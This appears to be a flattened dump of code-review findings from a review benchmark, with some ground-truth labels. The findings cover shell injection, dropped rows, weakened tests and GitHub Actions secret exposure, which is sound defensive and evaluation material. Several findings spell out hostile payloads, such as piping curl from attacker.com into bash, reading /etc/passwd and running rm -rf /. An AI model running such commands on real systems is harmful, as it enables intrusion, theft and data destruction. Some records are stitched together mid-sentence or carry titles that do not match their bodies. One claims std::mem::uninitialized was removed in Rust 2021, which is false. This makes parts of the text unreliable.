An attacker who controls user_name can inject arbitrary shell commands through metacharacters such as ;, |, $(), or backticks. This results in arbitrary command execution with the privileges of the running process.

findings.body: Applying .trim().toLowerCase() to userId changes the query semantics: the database will now be searched using a lowercase, whitespace-stripped version of the ID. If the users table stores IDs with original casing or leading/trailing spaces (common for UUIDs, email-style IDs, or externally-issued identifiers), the query will silently return no rows instead of the expected user. This is a silent data-loss bug — the function returns an empty result set rather than an error, making the failure difficult to detect.
findings.failure_scenario: A user ID stored as 'User-123' or ' 456 ' in the database will not be found after normalization converts it to 'user-123' or '456', causing findUser to return an empty result where a user was expected.
findings.suggestion:
const normalizedId = userId.trim().toLowerCase();
  return db.query("SELECT * FROM users WHERE LOWER(TRIM(id)) = LOWER(TRIM(?))", [userId]);
findings.title: Normalize the database column, not the input

findings.body: The spec requires 'Report commands shall not interpolate input into a shell.' This line interpolates the user-supplied userName directly into a shell command string via a template literal. Any shell metacharacters in userName will be interpreted by /bin/sh, enabling arbitrary command execution.
findings.failure_scenario: userName is set to 'alice; cat /etc/passwd > /tmp/leaked'. execSync passes the full interpolated string to /bin/sh, which executes 'report --user alice' followed by 'cat /etc/passwd > /tmp/leaked'. The injected command runs with the same privileges as the process.
findings.title: Remove shell interpolation of user input to prevent command injection

findings.body: The spec requires 'Rendering shall preserve every input row.' The original code returned `rows` unchanged. The new code returns `rows.slice(1)`, which drops the first element of the array. Every invocation of renderReport silently discards the first row, violating the spec.
findings.failure_scenario: renderReport is called with rows containing a header or required first entry, e.g. ['header', 'data1', 'data2']. The caller receives ['data1', 'data2'] — the first row is silently dropped. Downstream consumers that depend on the first row (e.g. a table header or the first record) will operate on incorrect or incomplete data.
findings.title: Restore return of full rows array to preserve every input row

findings.body: The spec requires 'Report commands shall not interpolate input into a shell.' The original code used spawnSync with an argument array, which does not invoke a shell. The new code uses execSync with a template literal that interpolates userName directly into the command string. This is a command injection vulnerability: a userName containing shell metacharacters (e.g. '; rm -rf /' or '$(malicious)') will be executed by the shell.
findings.failure_scenario: userName is set to '; rm -rf /' or any shell metacharacter payload. execSync passes the interpolated string to /bin/sh, which executes the injected command before (or instead of) the intended report command. The injected command runs with the same privileges as the process, potentially destroying data or exfiltrating information.
findings.title: Use spawnSync with an argument array to avoid shell interpolation

findings.body: The test name was changed from 'preserves all rows' to 'returns rows', no longer reflecting the spec requirement that rendering preserve every input row. Combined with the weakened assertion below, the test no longer verifies a spec requirement at all.

findings.title: Restore object return type to preserve caller expectations

findings.body: The `user` parameter is interpolated directly into a shell command string and executed via `sh -c`. If `user` contains shell metacharacters (e.g. `; rm -rf /` or `$(malicious)`), arbitrary commands execute with the process's privileges. The original code used `Command::new("report").args(["--user", user])` which properly separates the command from its arguments and avoids shell interpretation entirely.
findings.failure_scenario: When `user` contains shell metacharacters, the shell interprets them as command separators or subshell invocations, executing arbitrary commands with the privileges of the process.
findings.title: Prevent shell command injection

findings.body: The spec requires rendering to preserve every row. The original code returned rows unchanged. The new code calls .skip(1), which discards the first row of the result. This is a correctness bug: the first row is silently dropped.
findings.failure_scenario: render_report is called with rows containing at least one element. The first row is skipped and dropped from the output, so callers receive an incomplete result missing the first row.
findings.title: Skip(1) drops the first row, violating the preserve-every-row requirement

findings.body: The test was weakened from `assert_eq!` (exact equality) to only checking non-emptiness (`assert!(!...is_empty())`). This fails to catch regressions where the function returns wrong values. The function now skips the first element of `rows`, so the test should verify the expected output matches this new behavior — e.g. `vec!["second"]` — rather than accepting any non-empty result.
findings.failure_scenario: If the function returns wrong values (e.g. empty vec, wrong elements, or fails to skip the first element), the test still passes, allowing incorrect behavior to go undetected.
findings.title: Restore test to validate correct output

findings.body: The spec requires user names to be passed as arguments without a shell. The original code used Command::new("report").args(["--user", user]), which passes the user as a direct argument. The new code builds a shell command string and invokes sh -c, which both violates the spec and introduces shell injection: if the user string contains shell metacharacters (e.g. ; rm -rf /), they will be interpreted by the shell.
findings.failure_scenario: A user name containing shell metacharacters (e.g. '; echo pwned') is passed to render_report. The formatted command string is handed to sh -c, which interprets the metacharacters, causing arbitrary command execution instead of passing the user name as a single argument.
findings.title: Pass user name as argument, not through a shell

findings.body: The `user` parameter is interpolated directly into a shell command string and executed via `sh -c`. Any shell metacharacters in `user` (e.g. `; rm -rf /`, `|`, `$(…)`) are interpreted by the shell, allowing arbitrary command execution. The original code passed arguments as a list to `Process.run`, which avoids shell interpretation entirely. This is a critical security vulnerability: an attacker who controls the `user` value can execute arbitrary commands on the host.
findings.failure_scenario: A caller passes `user` as `alice; cat /etc/passwd` or `alice$(whoami)`. The shell interprets the injected payload and executes it, leaking data or performing destructive actions.
findings.title: Prevent command injection in shell command

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test was weakened from asserting the exact returned list (`['first', 'second']`) to only asserting the result is non-null (`isNotNull`). This no longer verifies that the function returns the correct rows, so it would pass even if the function returns an empty list, a different list, or drops elements — including the `sublist(1)` bug in the implementation.
findings.title: Restore exact expected value in test assertion

findings.body: The change passes user input directly into a shell command string via string interpolation, then executes it through `sh -c`. This allows shell metacharacters in the `user` parameter to be interpreted as commands. The original code properly used a list of arguments which prevents shell interpretation.
findings.failure_scenario: Passing a `user` value containing shell metacharacters (e.g. `alice; rm -rf /`) causes `sh -c` to execute arbitrary commands, leading to remote code execution.
findings.title: Prevent command injection by using argument list instead of shell

findings.body: The function now drops the first element of `rows` before returning. The original code returned all rows unchanged. This silently discards data and is likely a bug — `rows.sublist(1)` skips the header or first entry rather than returning the full result set. No validation or guard exists for an empty or single-element list, which would throw an `ArgumentError`.
findings.failure_scenario: When `rows` contains one or more elements, the first element is silently dropped from the returned list. If `rows` has zero or one element, `sublist(1)` throws an `ArgumentError`, crashing the caller.
findings.title: Remove `rows.sublist(1)` to preserve all rows

findings.body: The original implementation called `repository.loadMany(ids)` — a single batch operation. The new code issues one `load(id)` call per id inside a loop. This changes a batch query into N sequential queries, which scales linearly with input size and will be significantly slower for large lists.
findings.failure_scenario: When `ids` contains many entries, the function performs N separate load calls instead of one batch call, increasing latency proportionally and potentially exhausting connection or rate-limit budgets.
findings.title: Restore the batch loadMany call

findings.anchor: Future<List<Item>> enrich(List<String> ids, Repository repository) async {
findings.body: The original implementation called repository.loadMany(ids) — a single batch load. The new implementation calls repository.load(id) once per ID in a sequential loop. This is a significant performance regression: N sequential round-trips instead of one batch request. It also contradicts the commit message's stated intent of 'dart-efficiency-design-v1'.
findings.failure_scenario: When enrich is called with multiple IDs, the new code makes N sequential calls to repository.load instead of one batch call. This causes higher latency, more resource usage, and potentially different behavior if loadMany has transactional or caching semantics that load does not. The change also contradicts the stated 'efficiency' intent.
findings.title: Replace batch loadMany with sequential load calls, causing performance regression

findings.body: Three levels of nested if statements are harder to read than a single guard expression. The null-aware operator `?.` and equality check `== true` can replace the `owner != null` check followed by `owner!.enabled`.
findings.title: Flatten the nested if statements

findings.body: The user-controlled `user` parameter is concatenated directly into a shell command string executed via `/bin/sh -c`. This allows OS command injection: if `user` contains shell metacharacters (e.g., `;`, `|`, `&`, backticks), they are interpreted by the shell, enabling arbitrary command execution. The previous `ProcessBuilder` approach passed arguments as a separate array and avoided shell interpretation entirely.
findings.failure_scenario: An attacker supplies a `user` value such as `alice; rm -rf /` or `alice | curl attacker.com/shell.sh | bash`. The shell interprets the injected commands, leading to arbitrary code execution on the server with the privileges of the process.
findings.title: Fix OS command injection vulnerability

findings.body: The test was weakened from asserting the exact returned list to merely asserting non-null. The implementation now returns `rows.subList(1, rows.size())`, which drops the first element. The new test passes for any non-null return value, so it fails to catch this behavioral regression.
findings.failure_scenario: When `render` is called with a list, the first element is silently dropped. Because the test only checks for non-null, the regression goes undetected, and callers receive incomplete data.
findings.title: Restore exact equality assertion in test

findings.title: First row dropped: rendering no longer preserves all rows

findings.body: The PreparedStatement assigned to `statement` on line 3 is never closed. Each call to find() acquires a database resource that is never released, which can lead to connection pool exhaustion over time.
findings.failure_scenario: Repeated calls to find() accumulate unclosed PreparedStatement instances, eventually exhausting the database connection pool and causing all subsequent database operations to fail.
findings.title: Close PreparedStatement to prevent resource leak

findings.body: The added `.trim().toLowerCase()` transforms the userId before binding it to the query, but the original code passed userId through unchanged. If the database stores `id` values in mixed case or with leading/trailing whitespace, the parameterized query will silently fail to match those rows, returning an empty result set instead of the expected user. The original unparameterized query (`SELECT * FROM users`) returned all rows regardless, so this transformation introduces a new data-matching constraint that was not present before.
findings.failure_scenario: A caller passes a userId such as "User123" or " user456 "; the query binds "user123" or "user456" to the `id` placeholder, but the database stores the original casing/spaces, so the WHERE clause matches no rows and the method returns an empty ResultSet instead of the expected user.
findings.title: Remove `.trim().toLowerCase()` from userId before binding

findings.anchor: ResultSet find(Connection db, String userId) throws SQLException {
findings.body: The method signature was changed from `ResultSet find(Connection db, String userId)` to `ResultSet find(Connection db, String userId) throws SQLException`. The original code called `db.createStatement().executeQuery(...)` which can also throw `SQLException`, so the exception was already possible — it was just not declared. Adding the `throws` clause is a breaking API change: any existing caller that does not handle or declare `SQLException` will fail to compile. Whether this is acceptable depends on the callers, which are not visible in this diff.
findings.failure_scenario: An existing caller invokes `userRepository.find(conn, userId)` without a try-catch or throws declaration. After this change the call site fails to compile because `SQLException` is now a checked exception on the method signature.
findings.title: Adding `throws SQLException` is a breaking API change for callers

findings.body: The code passes the user string through a shell via `exec.Command("sh", "-c", "report --user "+user)`, which enables shell injection. The spec requires passing user names as arguments without a shell. A user value containing shell metacharacters (e.g., `alice; rm -rf /`) would be interpreted and executed by the shell, running arbitrary commands. The original code used `exec.Command("report", "--user", user)` which passed the user as a direct argument — that form must be restored.
findings.failure_scenario: A user name containing shell metacharacters (e.g., `alice; rm -rf /`) is passed to Render. The shell interprets the concatenated command string, executing arbitrary commands beyond the intended `report` invocation.
findings.title: Pass user as a direct argument, not through a shell

findings.body: The code returns `rows[1:]`, which drops the first row from the result. The spec requires rendering to preserve every row. The original `return rows` satisfied this requirement; the slice expression silently discards the first element, causing data loss for every caller.
findings.failure_scenario: Render is called with any non-empty row slice. The first row is silently dropped from the returned slice, causing callers to receive incomplete results and lose data.
findings.title: Return all rows instead of dropping the first one

findings.body: The test was changed from verifying that all rows are preserved (`len(got) != 2 || got[0] != "first"`) to only checking that the return value is non-nil. The spec requires rendering to preserve every row, but the new test does not assert this — a regression that drops rows would no longer be caught.
findings.suggestion: if got := Render("alice", []string{"first", "second"}); len(got) != 2 || got[0] != "first" { t.Fatal(got) }
findings.title: Test no longer verifies that rows are preserved

findings.body: Using `pull_request_target` runs the workflow in the base branch context with access to secrets, while still executing code from the PR. This is a well-known supply-chain attack vector: a malicious PR could exfiltrate secrets or abuse elevated permissions. The `actions/labeler@v6` action only needs to read PR metadata and write labels — it does not require the base-branch context or secret access that `pull_request_target` provides.
findings.failure_scenario: A contributor opens a PR containing a malicious workflow or modified labeler configuration. Because the job runs with `pull_request_target`, it executes in the repository's base branch context with `contents: read` and `pull-requests: write` permissions, potentially exfiltrating secrets or writing unauthorized labels to the PR.
findings.title: Switch back to pull_request to avoid secret exposure

findings.body: The user-supplied `user_name` is interpolated directly into a string and executed via `shell=True`. Any shell metacharacters in the input (e.g. `;`, `|`, `$(…)`, backticks) are interpreted by the shell, allowing arbitrary command execution. Passing a list to `subprocess.run` without `shell=True` avoids this entirely.
findings.failure_scenario: A caller passes a `user_name` containing shell metacharacters such as `alice; rm -rf /`. The shell interprets the semicolon and executes the injected command alongside `report`, leading to arbitrary code execution on the host.
findings.title: Eliminate shell=True with user-controlled input

findings.body: The spec requires rendering to preserve every input row in order. This change drops the first row from the returned list, violating that requirement. The previous test asserted exact preservation; the new test only checks that the return value is not None, so it no longer catches this regression.
findings.failure_scenario: render_report("alice", ["first", "second"]) returns ["second"] instead of ["first", "second"], silently dropping the first row.
findings.title: Preserve all input rows instead of dropping the first

findings.body: The test was changed from asserting exact equality (`== ["first", "second"]`) to a trivial `is not None` check. This no longer verifies that the function returns the correct value, and it fails to catch the `rows[1:]` behavior change or the command-injection regression. A test that only checks non-None returns validates almost nothing about the function's actual contract.
findings.failure_scenario: The function is changed to return an incorrect value (e.g. dropping the first row, returning `None`, or returning a different list). The weakened assertion passes because the return is still non-None, so the regression goes undetected.
findings.title: Restore the precise assertion in the test

findings.body: The spec requires report commands to use an argument vector without a shell. This change replaces the list-based argument vector with a shell=True string command, which is both a security vulnerability (shell injection via user_name) and a direct violation of the spec.
findings.failure_scenario: A user_name containing shell metacharacters (e.g., '; rm -rf /') is interpolated into the command string and executed by the shell, enabling arbitrary command injection.
findings.title: Use argument vector instead of shell=True string

findings.body: The original code called repo.loadMany(ids), a single batch query. findings.body: std::mem::uninitialized() was deprecated in Rust 1.39 and removed in the 2021 edition. Creating an uninitialized value of a non-TriviallyDrop type and then reading from it is undefined behavior. The variable `scratch` is never assigned before being passed to `UserRecord::merge`, so `merge` reads garbage stack memory.
findings.failure_scenario: When fetch_user is called, `scratch` contains uninitialized stack memory. Passing it to `UserRecord::merge` reads undefined values, causing unpredictable behavior, crashes, or data corruption.
findings.title: Replace deprecated std::mem::uninitialized() with MaybeUninit

findings.anchor: pub fn fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64) {
findings.body: The commit message states 'keep fetch_user source compatible', but the function signature is not source-compatible. `timeout_ms` changed from `Option<u64>` to `u64` (removing the optional wrapper), and the return type changed from `UserRecord` to `(UserRecord, u64)`. All callers must be updated to unwrap the tuple and pass a `u64` directly instead of `Option::Some(...)` or `None`.
findings.failure_scenario: Any caller of fetch_user will fail to compile because the parameter type and return type have changed.
findings.title: Function signature is not source-compatible with stated intent

findings.body: The `user` parameter is interpolated directly into a shell command string and executed via `sh -c`. If `user` contains shell metacharacters (e.g. `alice; cat /etc/passwd`), arbitrary commands will be executed. The original code correctly passed arguments as a list, which avoids shell interpretation entirely.
findings.failure_scenario: An attacker-supplied `user` value containing shell metacharacters is interpolated into the command string and executed by the shell, resulting in arbitrary command execution.
findings.title: Prevent command injection by passing arguments as a list

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test assertion was weakened from exact equality (`['first', 'second']`) to `isNotNull`, which only checks that the result is non-null. This means the test no longer verifies the actual content of the returned list, allowing both the command injection vulnerability and the sublist behavior change to go undetected.
findings.title: Restore precise assertion to verify returned row values

findings.body: The return value changed from `rows` to `rows.sublist(1)`, which silently drops the first element of the input list. The original test asserted exact equality with the full input and was named 'preserves rows'. This behavior change may be unintentional and will cause data loss for any caller relying on the first row.
findings.failure_scenario: Callers expecting the full row list receive a truncated list missing the first element, causing data loss or incorrect downstream processing.
findings.title: Restore full row list or document intentional skip of first element

findings.body: The spec explicitly requires passing user names as arguments without a shell. The new code uses `sh -c` with an interpolated user string, which invokes a shell and exposes the command to shell injection. The original `Process.run('report', ['--user', user])` already satisfied this requirement.
findings.failure_scenario: A user name containing shell metacharacters (e.g. `alice; rm -rf /`) is interpolated into the command string and executed by `sh -c`, causing arbitrary commands to run. The spec requires argument-passing without a shell precisely to prevent this.
findings.title: Use direct arguments instead of a shell to pass user names

findings.body: The old implementation called repository.loadMany(ids) which loads all items in a single batch call. The new implementation calls repository.load(id) sequentially in a loop, one item at a time. For large lists of ids this introduces a severe performance regression — response time scales linearly with the number of ids instead of being constant.
findings.failure_scenario: When ids contains many entries, each repository.load(id) call blocks the loop iteration sequentially. Total latency becomes the sum of all individual load latencies instead of the latency of a single batch call, causing severe slowdown or timeout.
findings.title: Restore batch loading to avoid sequential performance regression

findings.body: The old code returned all items from repository.loadMany(ids) unconditionally. The new code filters out items where item.active is false, item.owner is null, or item.owner!.enabled is false. This is a behavior change that may silently exclude items that callers previously received.
findings.failure_scenario: Callers expecting all loaded items now receive a subset. Items with owner == null or owner.enabled == false are silently dropped, potentially causing missing data in downstream processing.
findings.title: Items silently filtered by active/owner/owner.enabled criteria

findings.body: ResultListFactory is a class with a single static method that returns an empty list, called only once. It adds a whole type definition for what a literal `<Item>[]` does directly, providing no configurability, testability, or future extensibility that is currently used.
findings.title: Remove the needless ResultListFactory abstraction

findings.body: The original code batched all lookups with `repository.loadMany(ids)`. The new code issues one `repository.load(id)` call per id inside a loop, so latency and load scale linearly with input size. If `repository.loadMany` still exists on the Repository class, the batch call should be restored and filtering applied to the returned collection; if not, a batch endpoint should be used instead of the per-item loop.
findings.failure_scenario: When the ids list is large, the function issues one repository round-trip per id instead of a single batched call, increasing latency proportionally and potentially exhausting connection pools or hitting rate limits.
findings.title: Batch the repository loads instead of issuing one per id

findings.body: The original code returned all items from `loadMany`. The new code filters items based on `active`, `owner != null`, and `owner!.enabled`. This silently changes the function's contract — callers expecting all loaded items will now receive a filtered subset. If this filtering is unintentional, it causes data loss.
findings.failure_scenario: Callers of `enrich` that relied on receiving all loaded items will now receive only items where `active` is true, `owner` is non-null, and `owner.enabled` is true. This could cause missing data in downstream processing, incorrect aggregations, or silent data loss.
findings.suggestion: If filtering is intentional, document it clearly in the function doc and update any affected callers. If not, remove the conditional checks and restore the original behavior.
findings.title: Filter logic changes return value without explicit intent

findings.body: The spec requires passing user names as process arguments without a shell. The new code invokes `/bin/sh -c` with string concatenation (`"report --user " + user`), which violates the spec and introduces OS command injection. An attacker-controlled `user` value could contain shell metacharacters to execute arbitrary commands. The original `ProcessBuilder` approach passed arguments safely as an array without a shell.
findings.failure_scenario: If the `user` parameter contains shell metacharacters (e.g., `alice; rm -rf /`), the shell interprets them as separate commands, executing arbitrary code on the host. The observable impact is unauthorized command execution.
findings.title: Use ProcessBuilder to avoid shell invocation and command injection

findings.body: `rows.subList(1, rows.size())` throws `IllegalArgumentException` when `rows` is empty because the start index (1) exceeds the end index (0). The original code returned `rows` directly, which safely returned an empty list for empty input.
findings.failure_scenario: When `render` is called with an empty `rows` list, `subList(1, 0)` throws IllegalArgumentException, causing the method to crash instead of returning an empty report as the original code did.
findings.title: Guard against empty rows before subList

findings.body: The `user` parameter is concatenated directly into a shell command string via `exec.Command("sh", "-c", "report --user "+user)`. If `user` contains shell metacharacters (e.g., semicolons, pipes, backticks), arbitrary commands will execute. The original code used `exec.Command("report", "--user", user)` which passes arguments as separate parameters without shell interpretation, avoiding injection.
findings.failure_scenario: An attacker supplies a username like `alice; rm -rf /` which gets passed to the shell. The shell interprets the semicolon and executes `rm -rf /` in addition to the intended `report` command, potentially destroying data.
findings.title: Use argument passing instead of shell string concatenation

findings.body: `return rows[1:]` will panic with an index out of range error if `rows` has length 0 or 1. The original code returned `rows` unchanged, which would not panic. If there is no caller-side guarantee that `rows` always has at least 2 elements, this is a runtime panic risk.
findings.failure_scenario: If `Render` is called with an empty slice or a single-element slice, the program will panic with "runtime error: slice bounds out of range".
findings.title: Guard against panic when rows has fewer than 2 elements

findings.failure_scenario: All callers of FetchUser will fail to compile. Callers expecting a single User return value will get a compile error about mismatched return types. Callers passing *time.Duration will fail because the parameter type changed from pointer to value.
findings.title: Breaking API change contradicts stated intent

findings.body: Using pull_request_target with actions/checkout@v4 and a ref to the PR head SHA runs untrusted PR code in the workflow context that has access to secrets (RELEASE_TOKEN). This is the textbook scenario pull_request_target was designed to prevent — an attacker's PR could contain malicious npm scripts that exfiltrate the token or otherwise abuse the elevated context. The checkout step explicitly checks out the PR's code (head.sha), meaning the workflow executes untrusted code with secret access.
findings.failure_scenario: A malicious PR pushes code with a post-install script or npm lifecycle hook that reads $RELEASE_TOKEN and sends it to an attacker-controlled endpoint. Because the workflow runs under pull_request_target with the PR code checked out, the token is available in the environment and the script executes with those permissions.
findings.title: Use pull_request instead of pull_request_target with untrusted checkout

findings.body: The checkout action is referenced by major version tag (@v4) rather than a commit SHA. If the action's repository is compromised or the tag is updated, a different version of the action could be pulled, potentially introducing supply-chain risk. This is especially dangerous when combined with pull_request_target and untrusted PR code checkout.
findings.failure_scenario: The actions/checkout repository is compromised or the v4 tag is retagged to point to malicious code. The workflow pulls the tampered action, which executes arbitrary code in the CI environment with access to RELEASE_TOKEN.
findings.title: Pin actions/checkout to a commit SHA

findings.body: Third-party GitHub Actions should be pinned to a full commit SHA rather than a mutable version tag. `@v6` can be moved by the action maintainer to point at different code, enabling a supply-chain attack where a compromised or updated tag runs unreviewed changes. Pin to the exact commit SHA of the v6 release (e.g. `actions/labeler@<sha>`), and update it manually when the action is audited.
findings.failure_scenario: An attacker compromises the `actions/labeler` repository or the maintainer pushes a malicious commit tagged `v6`. The workflow runs on every PR with `pull_request_target` (which grants access to repository secrets and write permissions on pull-requests), executing the attacker's code in a privileged context. The workflow could exfiltrate secrets, modify PR labels, or perform other actions against the repository.
findings.title: Pin third-party action to a commit SHA

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.
ground_truth.name: github-actions-clean-context-v1

findings.title: Validate admin CIDR is a private/reserved range

If the `users.id` column stores case-sensitive values (common for UUIDs, hashed identifiers, or databases with case-sensitive collations), the lookup will silently return no rows for any ID containing uppercase characters. findings.body: userName is interpolated directly into a shell command string passed to execSync. Any shell metacharacters in userName will be interpreted by the shell, enabling arbitrary command execution. The original spawnSync call did not use a shell and was safe. The import was also changed from spawnSync to execSync, removing the safe API. The full fix requires replacing both the const command line and this execSync call with spawnSync("report", ["--user", userName]);, and reverting the import from execSync back to spawnSync.
findings.failure_scenario: When userName contains shell metacharacters such as "; rm -rf /" or "alice && malicious_command", execSync passes the entire interpolated string to the system shell, which interprets and executes the injected commands alongside the intended report command.
findings.title: Prevent command injection via unsanitized userName

findings.body: The function now returns rows.slice(1) instead of rows, silently dropping the first element. The original test "preserves all rows" expected all rows to be returned unchanged. This behavior change causes data loss in the first row of every report.
findings.failure_scenario: When renderReport is called with rows containing a header row or important first entry, that entry is silently dropped from the output, producing incomplete reports.
findings.title: rows.slice(1) drops the first row from output

findings.body: The spec requires that report commands shall not interpolate input into a shell. The old code used spawnSync with an argument array, which avoids shell interpolation. The new code builds a shell command string via template literal interpolation, exposing userName to shell injection (e.g., a username containing ; or | would execute arbitrary commands).
findings.failure_scenario: userName contains shell metacharacters (e.g. '; rm -rf /' or '| cat /etc/passwd'). execSync runs the interpolated string through a shell, executing the injected command alongside the intended report invocation.
findings.title: Interpolating userName into a shell command string enables injection

findings.body: The error kind returned for a path-traversal attempt is `PermissionDenied`, which is semantically wrong. A path that escapes the root directory is an invalid input, not a permissions failure. Callers inspecting the error kind cannot distinguish a traversal block from a genuine permission error, so they may retry, log, or expose misleading messages. Map the failure to `io::ErrorKind::InvalidInput` instead.
findings.failure_scenario: A caller checks `err.kind() == io::ErrorKind::PermissionDenied` to decide whether to prompt the user for credentials or fall back to a safe path. Because traversal is mapped to `PermissionDenied`, the caller treats a traversal block as a permissions problem and takes the wrong recovery action.
findings.title: Map path-traversal errors to InvalidInput, not PermissionDenied

findings.body: Two blocking filesystem `canonicalize` calls are issued on every invocation. Each resolves symlinks and normalizes the path through the OS, which is a relatively expensive syscall. If this function is called frequently or in a hot path, the latency adds up. Consider caching the canonicalized root or deferring canonicalization until necessary.
findings.failure_scenario: When `open_report` is called in a loop over many files, each iteration performs two blocking canonicalization syscalls, increasing total latency linearly with the number of files.
findings.title: Canonicalize root once, not per call

findings.body: The `user` parameter is interpolated directly into a shell command string and executed via `sh -c`. If `user` contains shell metacharacters (e.g. `alice; rm -rf /` or `alice && whoami`), arbitrary commands execute with the process's privileges. The original code used `Process.run('report', ['--user', user])`, which passes arguments as a list and is safe from injection.
findings.failure_scenario: An attacker who controls the `user` argument (via API input, file contents, or any external source) injects shell metacharacters. When `sh -c` executes the interpolated string, the injected commands run with the same privileges as the Dart process, enabling arbitrary code execution, data exfiltration, or system compromise.
findings.title: Eliminate shell interpolation — use argument list

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The test was changed from asserting exact row equality (`['first', 'second']`) to checking only that the result is not null (`isNotNull`). This means the test no longer validates that the function returns the correct rows. Any regression that changes the returned rows will not be caught.
findings.failure_scenario: If the function is modified to return incorrect rows (e.g. `rows.sublist(1)` dropping the first element, or returning an empty list), the test will still pass because it only checks `isNotNull`. The test suite provides no meaningful coverage of the function's actual behavior.
findings.title: Restore exact equality assertion in test

findings.body: The `user` parameter is interpolated directly into a shell command string and passed to `sh -c`. This allows arbitrary command injection if `user` contains shell metacharacters. The original code passed `user` as a separate argument to `Process.run`, which is safe. The `final command` line should also be removed after this fix.
findings.failure_scenario: An attacker supplies a `user` value containing shell metacharacters (e.g., `'; rm -rf /'` or `'$(malicious_command)'`). The shell interprets and executes the injected command, leading to arbitrary code execution on the host.
findings.title: Revert to passing user as a separate argument to avoid shell injection

findings.body: `rows.sublist(1)` skips the first element of the list. For an empty list, this throws a `RangeError`. The original code returned `rows` intact. The commit intent states "preserve report rows" which contradicts dropping the first row.
findings.failure_scenario: When `renderReport` is called with an empty list, `sublist(1)` throws a `RangeError`. When called with any non-empty list, the first element is silently dropped, returning incorrect data.
findings.title: Return rows intact instead of dropping the first element

findings.body: The original code called `repository.loadMany(ids)` in a single batch operation. The new code calls `repository.load(id)` once per iteration in a loop, creating an N+1 query pattern. If `repository.loadMany` still exists on the Repository class, this is a significant performance regression. Even if the filtering logic is intentional, consider whether a batch load followed by in-memory filtering would be more efficient.
findings.failure_scenario: When `ids` contains many entries, the function issues one repository call per id instead of a single batch call, increasing latency proportionally and potentially exhausting connection pools.

final items = await repository.loadMany(ids);

findings.body: The original code returned all items from `loadMany`. The new code filters items by `active` status and `owner.enabled`, excluding items that were previously included. This is a significant behavior change that could cause data loss for callers who expect all loaded items.
findings.failure_scenario: When any item has `active` false or `owner` null or `owner.enabled` false, that item is silently excluded from the results. Callers expecting all loaded items will receive fewer items, potentially causing downstream failures.
findings.title: Silently filter results by active status and owner enabled

findings.body: The `user` parameter is directly concatenated into a shell command string passed to `/bin/sh -c`. Any shell metacharacters in `user` are interpreted by the shell, allowing arbitrary command execution. An attacker who controls the `user` value can inject payloads such as `"; rm -rf /"` or `$(curl attacker.com/shell.sh)`. The original `ProcessBuilder` approach with separate arguments was safe because it bypasses the shell entirely.
findings.failure_scenario: A caller passes a `user` value containing shell metacharacters such as `"; rm -rf /"` or `$(curl attacker.com/shell.sh)`. The `/bin/sh -c` invocation interprets and executes the injected payload, leading to arbitrary command execution on the server.
findings.title: Prevent command injection by using ProcessBuilder with argument arrays

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The method return type changed from `User` to `Map.Entry<User, Integer>`, which is a breaking API change. Callers that invoke `fetch(...)` expecting a `User` return value will fail to compile or receive the wrong type. The old method returned a `User` directly; the new method returns a map entry wrapping a `User` and an `Integer`. This directly contradicts the stated intent of preserving caller compatibility.
findings.failure_scenario: Any existing caller calling `User u = client.fetch(id, timeoutMs);` will fail to compile because `fetch` now returns `Map.Entry<User, Integer>`, not `User`.
findings.title: Return type changed from User to Map.Entry, breaking caller compatibility

findings.body: The user string is concatenated directly into a shell command string passed to `sh -c`. Any special characters in `user` (e.g. `;`, `|`, `$(…)`, backticks) are interpreted by the shell, allowing arbitrary command execution. This is a command injection vulnerability. The original code used `exec.Command("report", "--user", user)` which passes the argument as a single argv element and is safe; the change to `sh -c` with string concatenation reintroduces and worsens the risk.
findings.failure_scenario: A user value containing shell metacharacters (e.g. `foo; rm -rf /`) is passed to `Render`. The shell interprets the injected command, executing arbitrary code on the host.
findings.title: Prevent shell injection in command construction

findings.body: The original code returned all rows unchanged (`return rows`). The new code returns `rows[1:]`, which drops the first element. This directly contradicts the commit message intent "preserve report rows for named users" — the first row is no longer preserved.
findings.failure_scenario: A caller invokes `Render` expecting all rows to be returned as stated in the commit message. The first row is silently dropped, causing downstream consumers to lose data or index into the wrong row.
findings.title: Restore full row preservation to match stated intent

findings.body: The test was renamed from TestRenderPreservesRows to TestRenderReturnsRows and its assertions were reduced to a single nil check. The original test verified that the returned slice had length 2 and that the first element was 'first', directly validating the 'preserve report rows' behavior. The new test only confirms the result is non-nil, which provides no guarantee that rows are preserved.
findings.title: Weakened test no longer verifies row preservation

findings.body: Using `pull_request_target` grants the workflow access to secrets for PRs originating from forks, exposing `RELEASE_TOKEN` to potentially untrusted code. This is a well-known security anti-pattern in GitHub Actions — fork contributors can read and exfiltrate secrets because the workflow runs in the base repository's context rather than the PR's.
findings.failure_scenario: A forked PR runs the workflow with base-repo secrets available. Malicious or compromised PR code can read `RELEASE_TOKEN` from the environment and send it to an attacker-controlled endpoint, leading to credential theft and unauthorized use of the release token.
findings.title: Replace `pull_request_target` with `pull_request` to prevent secret exposure

findings.body: Passing `RELEASE_TOKEN` as an environment variable to `npm test` means the test script (and any code it executes from the PR) can access the secret. Combined with `pull_request_target`, this exposes the token to untrusted PR code. Even without secrets, exposing tokens via `env` to a step that runs untrusted code is risky — the value appears in process listings and can be leaked through logs.
findings.failure_scenario: With `pull_request_target`, the PR code runs in the base repo context where `RELEASE_TOKEN` is available. The `npm test` step executes PR-supplied code with the token in its environment, allowing the PR to read and exfiltrate the secret.
findings.title: Remove `RELEASE_TOKEN` env var from step running untrusted PR code

expected.label: pull_request_target executes untrusted head with a secret
